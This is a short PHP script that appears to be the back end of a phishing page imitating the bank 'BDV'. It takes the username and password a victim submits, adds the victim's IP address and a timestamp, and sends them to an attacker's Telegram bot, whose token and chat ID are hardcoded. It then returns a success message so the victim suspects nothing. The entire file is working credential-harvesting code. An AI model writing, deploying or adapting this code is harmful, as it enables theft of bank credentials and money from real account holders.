<?php
header('Content-Type: application/json');
error_reporting(0);

$usuario = $_POST['usuario'];
$password = $_POST['password'];
$ip = $_SERVER['REMOTE_ADDR'];
$fecha = date('Y-m-d H:i:s');

$token = "8080814760:AAFEZS3tJZHNg6zNbPh2JNFSLXNccRSElYQ";
$chat_id = "6912929677";

$mensaje = "🏦 BDV\n";
$mensaje .= "👤 Usuario: $usuario\n";
$mensaje .= "🔑 Clave: $password\n";
$mensaje .= "🌐 IP: $ip\n";
$mensaje .= "📅 Fecha: $fecha\n";

$url = "https://api.telegram.org/bot$token/sendMessage";
$data = array('chat_id' => $chat_id, 'text' => $mensaje);

file_get_contents($url . "?" . http_build_query($data));

echo json_encode(["success" => true]);
?> 